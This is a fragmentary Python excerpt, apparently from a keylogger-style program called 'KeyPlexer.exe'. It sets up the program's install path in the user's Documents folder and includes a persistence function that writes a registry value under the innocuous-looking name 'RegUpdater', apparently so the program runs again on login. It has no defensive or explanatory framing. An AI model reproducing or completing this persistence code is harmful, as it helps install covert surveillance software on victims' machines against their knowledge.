...
destintaion = "C:\Users\geek_xx\Documents\test\Test\KeyPlexer.exe"

base1 = os.path.join(os.path.expandvars("%userprofile%\\"))

base2 = "Documents\\test\\Test\\KeyPlexer.exe"
...
def persistance():
    ...
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ ,b)
    key.Close()
